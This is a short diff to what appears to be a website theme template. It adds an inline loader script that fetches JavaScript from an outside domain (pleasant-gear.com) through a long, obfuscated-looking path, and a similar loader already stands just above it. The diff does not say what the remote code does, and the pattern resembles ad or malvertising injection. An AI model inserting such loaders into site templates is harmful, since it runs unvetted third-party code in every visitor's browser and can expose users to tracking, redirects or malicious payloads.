@@ -14,6 +14,18 @@ s.referrerPolicy = 'no-referrer-when-downgrade';
 l.parentNode.insertBefore(s, l);
 })({})
 </script>
+<script>
+(function(kqlr){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = kqlr || {};
+s.src = "\/\/pleasant-gear.com\/b.XCV\/sXd\/Gale0lYmWscr\/peDm\/9kuaZRUxl\/kEPNTMYQ2BMaDZAH4GNPz\/UctKN\/j\/YFwuM-Degk3MNFgq";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 
 {%- if theme.favicon.apple_touch_icon %}
   <link rel="apple-touch-icon" sizes="180x180" href="{{ url_for(theme.favicon.apple_touch_icon) }}">
